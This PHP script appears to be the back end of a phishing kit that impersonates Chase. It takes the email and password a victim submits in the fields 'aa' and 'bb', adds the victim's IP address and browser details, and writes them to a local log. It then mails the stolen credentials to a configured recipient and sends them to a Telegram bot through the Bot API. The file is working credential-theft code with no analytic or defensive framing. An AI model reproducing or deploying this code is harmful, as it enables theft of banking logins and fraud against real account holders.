<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

require("./setting.php");



function get_client_ip()
{
    $ipaddress = "";
    if (getenv("HTTP_CLIENT_IP"))
        $ipaddress = getenv("HTTP_CLIENT_IP");
    else if (getenv("HTTP_X_FORWARDED_FOR"))
        $ipaddress = getenv("HTTP_X_FORWARDED_FOR");
    else if (getenv("HTTP_X_FORWARDED"))
        $ipaddress = getenv("HTTP_X_FORWARDED");
    else if (getenv("HTTP_FORWARDED_FOR"))
        $ipaddress = getenv("HTTP_FORWARDED_FOR");
    else if (getenv("HTTP_FORWARDED"))
        $ipaddress = getenv("HTTP_FORWARDED");
    else if (getenv("REMOTE_ADDR"))
        $ipaddress = getenv("REMOTE_ADDR");
    else
        $ipaddress = "UNKNOWN";
    return $ipaddress;
}

function get_browser_details()
{
    $browser = $_SERVER['HTTP_USER_AGENT'];
    return $browser;
}

$IP = get_client_ip();
$USER = $_POST['aa'];
$PASS = $_POST['bb'];




$Message = "CHASE LOGS {EMAIL ACCESS}" . PHP_EOL;
$Message .= "Email: " . $USER . PHP_EOL;
$Message .= "Password: " . $PASS . PHP_EOL;
$Message .= "IP ADDRESS : https://ip-api.com/" . $IP . PHP_EOL;
$Message .= "Browser Details: " . get_browser_details() . PHP_EOL; // Add browser details here

$subject = "❤Web LOGS {Login Access}❤ | $IP";
$headers = "From: ❤CHASE-ACCESS❤ <julianna1@gmail.com>\r\n"; //  edit to a valid email address {optional}
$headers .= "MIME-Version: 1.0\r\n";

$logFilePath = 'emaillog.txt';
file_put_contents($logFilePath, $Message, FILE_APPEND);

$send = mail($recipient, $subject, $Message, $headers);

if ($send) {
    echo "Successful sending email";
} else {
    echo "Error sending email";
}


// Telegram
$website = "https://api.telegram.org/bot{$botToken}";
$params = [
    'chat_id' => $user_id,
    'text' => $Message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);


if ($result !== false) {

    echo "Form data sent to Telegram successfully!";
} else {

    echo "Failed to send form data to Telegram.";
}
?>
